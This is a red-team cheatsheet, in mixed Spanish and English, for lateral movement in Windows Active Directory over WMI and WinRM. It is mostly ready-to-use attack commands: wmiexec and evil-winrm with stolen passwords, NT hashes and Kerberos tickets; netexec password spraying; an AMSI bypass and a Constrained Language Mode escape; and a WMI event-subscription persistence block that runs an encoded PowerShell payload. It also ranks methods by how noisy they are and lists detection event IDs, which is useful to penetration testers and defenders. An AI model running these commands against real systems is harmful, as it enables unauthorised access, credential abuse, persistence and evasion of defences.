---
aliases:
  - "WinRM (PSRemoting)"
  - "WMI y DCOM Lateral"
  - WMI Lateral Movement
  - WinRM Lateral Movement
  - wmiexec
  - PS Remoting
tags:
  - type/technique
  - technique/lateral-movement
  - technique/execution
  - env/windows
  - asset/active-directory
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Lateral Movement]]"
tertiary categories:
  - "[[Active Directory]]"
kind: Tool
linked:
  - "[[Active Directory Explotación]]"
  - "[[evil-winrm]]"
  - "[[netexec]]"
  - "[[Impacket Toolkit]]"
  - "[[Pass-the-Hash]]"
  - "[[Pass-the-Ticket]]"
---
# WMI and WinRM

***

## Cheatsheet
^wmi-winrm

| Método | Comando | Puerto |
| --- | --- | --- |
| **WMI exec (Linux)** | `impacket-wmiexec dom/user:pass@target` | 135 + high RPC |
| **WMI con hash** | `impacket-wmiexec -hashes :NT dom/user@target` | 135 |
| **WinRM (Linux)** | `evil-winrm -i target -u user -p pass` | 5985/5986 |
| **WinRM PtH** | `evil-winrm -i target -u user -H NTHASH` | 5985 |
| **netexec WinRM** | `nxc winrm target -u user -p pass -x whoami` | 5985 |
| **PS Remoting** | `Enter-PSSession -ComputerName target -Credential (Get-Credential)` | 5985 |
| **Invoke-Command** | `Invoke-Command -ComputerName target -ScriptBlock {whoami}` | 5985 |
| **WMIC remoto (CLI)** | `wmic /node:target /user:dom\user process call create "cmd.exe /c ..."` | 135 |
| **WMI via PS** | `Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c ..." -ComputerName target` | 135 |

***

## Concepto

**WMI** (Windows Management Instrumentation) y **WinRM** (Windows Remote Management) son canales de management Microsoft-blessed — low-signal relativo a PsExec/SMBexec. Ambos integran con Kerberos + PtH + PtT.

| Canal | Protocolo | Puertos | Requisito |
| --- | --- | --- | --- |
| **WMI** | DCOM / RPC | 135 + RPC dinámico (49152-65535) | Admin local o `DCOM Users` |
| **WinRM** | HTTP(S) SOAP | 5985 (HTTP), 5986 (HTTPS) | `Remote Management Users` o Admin |

WinRM habilitado por default en **Server 2012+**. Workstations: off por default (requiere `Enable-PSRemoting`).

## 1. WMI exec

### impacket-wmiexec (Linux)

```bash
# Password
impacket-wmiexec dom.local/user:pass@target

# Pass-the-hash
impacket-wmiexec -hashes :ABC123NTHASH dom.local/user@target

# Kerberos ticket
export KRB5CCNAME=user.ccache
impacket-wmiexec -k -no-pass dom.local/user@target.dom.local

# Semi-interactive (no tty real, pero cmd loop)
# wmiexec abre SMB share para output → SMB signing debe permitirlo
impacket-wmiexec -share C$ dom/user:pass@target
```

### WMIC nativo (on-host Windows)

```cmd
wmic /node:target /user:dom\user /password:pass process call create "cmd.exe /c whoami > C:\Windows\Temp\o.txt"

# Después lee el output via SMB
type \\target\C$\Windows\Temp\o.txt
```

### PowerShell WMI

```powershell
# Invoke-WmiMethod (legacy pero funciona)
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\temp\o.txt" -ComputerName target -Credential $cred

# CIM (newer, preferred)
$cred = Get-Credential
$opt = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName target -Credential $cred -SessionOption $opt
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd /c whoami > C:\temp\o.txt"}
```

### netexec WMI

```bash
# Execution via WMI
nxc wmi target -u user -p pass -x whoami

# PtH
nxc wmi target -u user -H NTHASH -x 'net user'
```

## 2. WinRM

### evil-winrm (Linux)

```bash
# Password
evil-winrm -i target -u user -p pass

# Pass-the-hash
evil-winrm -i target -u user -H ABC123NTHASH

# Con AMSI + CLM bypass
evil-winrm -i target -u user -p pass -o    # remote path completion
# Dentro: Bypass-4MSI
```

Ver [[evil-winrm]] en profundidad.

### Pass-the-ticket WinRM

```bash
# 1. Obtener TGT (Rubeus, ticketer, impacket)
# 2. Convertir a ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache

# 3. Editar /etc/krb5.conf con el dominio
# 4. Conectar
evil-winrm -i target.dom.local -r dom.local
```

### PS Remoting (on-host Windows)

```powershell
# Enter interactive session
Enter-PSSession -ComputerName target -Credential (Get-Credential)

# Single command
Invoke-Command -ComputerName target -ScriptBlock { Get-Process }

# Archivo de script
Invoke-Command -ComputerName target -FilePath C:\scripts\enum.ps1

# Múltiples hosts en paralelo
Invoke-Command -ComputerName @(target1,target2,target3) -ScriptBlock { whoami } -Credential $cred

# Con Kerberos double-hop (CredSSP)
Enable-WSManCredSSP -Role Client -DelegateComputer target -Force
Enter-PSSession -ComputerName target -Authentication Credssp -Credential $cred
```

### netexec WinRM

```bash
# Spray + exec
nxc winrm target -u users.txt -p 'Spring2026!' --continue-on-success
nxc winrm target -u user -p pass -x 'whoami /all'

# Módulos
nxc winrm target -u user -p pass -M spider_plus
```

## 3. WSMan cmdlets low-level

```powershell
# Configuración cliente
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="target1,target2"}'

# Test de acceso
Test-WSMan -ComputerName target -Credential $cred

# Listener remoto
winrm e winrm/config/listener -r:target
```

## 4. Runspace escape (evadir CLM via nested session)

```powershell
# Si PS está en Constrained Language Mode
$rs = [RunspaceFactory]::CreateRunspace()
$rs.Open()
$ps = [PowerShell]::Create()
$ps.Runspace = $rs
$ps.AddScript("Get-Process").Invoke()
```

## 5. Persistence via WMI

```powershell
# Event subscription → callback on trigger (logon, timer, process start)
$filterArgs = @{
    Name = 'EvilFilter'
    EventNameSpace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs

$consumerArgs = @{
    Name = 'EvilConsumer'
    CommandLineTemplate = "powershell.exe -enc <BASE64>"
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}
```

Detectable via Sysmon Event ID 19/20/21 (WMIEventSubscription).

## 6. Opsec comparación

| Método | Evento clave | Ruido | Notes |
| --- | --- | --- | --- |
| **wmiexec** | 4624 logon type 3 + WMI-Activity/Trace 5861 | Medio | Crea SMB share C$ para output |
| **WinRM** | 4624 logon type 3 + WinRM operational 91 | Bajo | Encriptado, soft-flag en DFIR |
| **PsExec** | 7045 service installed | Alto | Crea service `PSEXESVC` |
| **smbexec** | 7045 service SystemFunction | Alto | Similar a PsExec |
| **RDP** | 4624 type 10 | Visible | UI interactiva |

### Tips

- **WMI** spawnea `WmiPrvSE.exe` (host process) → abuse sin crear service.
- **WinRM** deja `wsmprovhost.exe` running — hunt trigger si user no admin.
- **Kerberos double-hop** (WinRM → segundo hop) requiere CredSSP o delegation — por default falla.

## 7. Troubleshooting

| Error | Causa | Fix |
| --- | --- | --- |
| `WinRM cannot process request` | Puerto 5985 cerrado | Try 5986 HTTPS, firewall rule |
| `Access denied` WinRM | User no en `Remote Management Users` | Check con nxc `winrm Pwn3d!` |
| `RPC server unavailable` WMI | Firewall bloquea DCOM dinámico | WMI requiere puerto dinámico 49152-65535 |
| `Kerberos ticket not found` | KRB5CCNAME mal seteado | `klist` para verificar |

## Recursos

- [HackTricks - Lateral Movement](https://book.hacktricks.xyz/windows-hardening/lateral-movement)
- [Impacket wmiexec](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)
- [evil-winrm GitHub](https://github.com/Hackplayers/evil-winrm)
- [Matt Nelson - WMI Tradecraft](https://www.specterops.io/blog/wmi)

***
